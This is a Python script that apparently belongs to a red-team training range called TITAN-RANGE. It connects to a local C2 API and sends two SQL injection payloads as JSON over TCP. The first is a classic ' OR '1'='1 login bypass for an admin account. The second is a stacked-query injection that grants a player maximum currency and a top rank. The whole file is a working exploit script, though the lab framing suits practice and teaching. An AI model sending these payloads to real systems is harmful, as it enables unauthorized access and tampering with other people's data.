import socket
import time

C2_HOST = '127.0.0.1'
C2_PORT = 7777


def send_payload(sock, json_str):
    """Sends a raw TCP packet with a newline character for Java's readLine()"""
    print(f"\n[RED TEAM] Injecting Payload -> {json_str}")
    sock.sendall((json_str + '\n').encode('utf-8'))


def execute_attacks():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((C2_HOST, C2_PORT))
        print("[NETWORK] Connected to TITAN-RANGE C2 API.")

        # --- ATTACK 1: Auth Bypass (Classic SQLi) ---
        print("\n=== PHASE 1: Authentication Bypass ===")
        print("Attempting to log in as 'admin_master' without the password...")
        time.sleep(2)

        # Payload injects ' OR '1'='1 to make the WHERE clause always evaluate to TRUE
        payload_1 = '{"action":"ADMIN_LOGIN", "username":"admin_master\' OR \'1\'=\'1", "password":""}'
        send_payload(s, payload_1)
        time.sleep(4)

        # --- ATTACK 2: Economy Manipulation (Stacked Query SQLi) ---
        print("\n=== PHASE 2: Economy & Privilege Escalation ===")
        print("Using a Second-Order style injection via the 'Update Profile' endpoint...")
        time.sleep(2)

        # Payload ends the first UPDATE string, adds a semicolon, and starts a SECOND unauthorized UPDATE
        # This gives 'hacker_zero' max currency and sets their rank to PREDATOR
        malicious_msg = "hacked_you\'; UPDATE fps_players SET currency=9999999, rank=\'PREDATOR\' WHERE username=\'hacker_zero\'; --"
        payload_2 = f'{{"action":"UPDATE_PROFILE", "username":"hacker_zero", "msg":"{malicious_msg}"}}'

        send_payload(s, payload_2)
        print("\n[RED TEAM] Attacks dispatched. Check Java GUI and PostgreSQL to verify impact.")

        time.sleep(2)
        s.close()

    except ConnectionRefusedError:
        print("[FATAL] Could not connect. Make sure TitanRangeC2.java is running!")


if __name__ == "__main__":
    print("--- TITAN-RANGE: MALICIOUS CLIENT SIMULATOR ---")
    execute_attacks()